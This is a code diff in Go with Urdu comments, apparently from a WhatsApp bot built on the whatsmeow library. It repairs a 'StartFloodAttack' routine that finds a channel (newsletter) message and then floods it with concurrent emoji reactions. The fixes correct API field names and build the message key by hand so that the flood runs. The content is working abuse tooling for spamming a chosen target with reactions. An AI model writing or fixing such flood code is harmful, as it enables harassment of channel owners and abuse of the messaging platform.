@@ -69,8 +69,7 @@ func StartFloodAttack(client *whatsmeow.Client, v *events.Message) {
 	}
 	targetJID := metadata.ID
 
-	// 3. FETCH LOGIC (یہ سب سے اہم حصہ ہے)
-	// ہم سرور سے کہتے ہیں: "فلاں ID والا میسج مجھے لا کر دو"
+	// 3. FETCH LOGIC
 	// ہم اس آئی ڈی سے اگلی آئی ڈی (Before) مانگیں گے تو ہمیں پچھلا میسج مل جائے گا
 	fetchParams := &whatsmeow.GetNewsletterMessagesParams{
 		Count:  1,
@@ -91,25 +90,34 @@ func StartFloodAttack(client *whatsmeow.Client, v *events.Message) {
 	// میسج مل گیا!
 	foundMsg := fetchedMsgs[0]
 	
-	// اب ہم چیک کریں گے کہ کیا واقعی یہی وہ میسج ہے؟
-	if int(foundMsg.ServerID) != serverMsgID {
-		replyToUser(client, userChat, fmt.Sprintf("❌ آئی ڈی میچ نہیں ہوئی!\nFound: %d, Wanted: %d", foundMsg.ServerID, serverMsgID))
-		// لیکن پھر بھی ہم اسی پر اٹیک کریں گے جو ملا ہے، شاید کام کر جائے
+	// FIX 1: ServerID -> MessageServerID
+	if int(foundMsg.MessageServerID) != serverMsgID {
+		replyToUser(client, userChat, fmt.Sprintf("❌ آئی ڈی میچ نہیں ہوئی!\nFound: %d, Wanted: %d", foundMsg.MessageServerID, serverMsgID))
 	}
 
-	replyToUser(client, userChat, fmt.Sprintf("✅ میسج مل گیا! (ServerID: %d)\nفلڈ شروع... 🚀", foundMsg.ServerID))
+	replyToUser(client, userChat, fmt.Sprintf("✅ میسج مل گیا! (ServerID: %d)\nفلڈ شروع... 🚀", foundMsg.MessageServerID))
+
+	// FIX 2: Manually construct the Key because foundMsg.Message.Key doesn't exist directly
+	// NewsletterMessage struct usually has ID (JID) but not a Proto Key directly attached in a simple way sometimes
+	// We will construct it manually which is safer.
+	
+	floodKey := &waProto.MessageKey{
+		RemoteJID: proto.String(targetJID.String()),
+		FromMe:    proto.Bool(false), // Newsletter messages are never "FromMe" in context of reaction
+		ID:        proto.String(strMsgID), // The string version of ID
+	}
 
 	// 4. FLOOD using EXACT KEY
-	// اب ہم "تکا" نہیں لگا رہے، جو Key سرور نے دی ہے وہی واپس بھیج رہے ہیں
-	performFlood(client, targetJID, foundMsg.Message.Key)
+	performFlood(client, targetJID, floodKey)
 	
 	replyToUser(client, userChat, "✅ مشن مکمل۔")
 }
 
-// اس فنکشن کو تبدیل کیا ہے تاکہ یہ Original Key قبول کرے
 func performFlood(client *whatsmeow.Client, chatJID types.JID, originalKey *waProto.MessageKey) {
 	var wg sync.WaitGroup
-	fmt.Printf(">>> Flooding on Msg ID: %s\n", originalKey.GetId())
+	
+	// FIX 3: GetId -> GetID
+	fmt.Printf(">>> Flooding on Msg ID: %s\n", originalKey.GetID())
 
 	for i := 0; i < FloodCount; i++ {
 		wg.Add(1)
@@ -121,7 +129,7 @@ func performFlood(client *whatsmeow.Client, chatJID types.JID, originalKey *waPr
 				ReactionMessage: &waProto.ReactionMessage{
 					Key: &waProto.MessageKey{
 						RemoteJID: originalKey.RemoteJID,
-						FromMe:    originalKey.FromMe, // جو سرور نے دیا وہی استعمال ہوگا
+						FromMe:    originalKey.FromMe,
 						ID:        originalKey.ID,
 					},
 					Text:              proto.String(TargetEmoji),
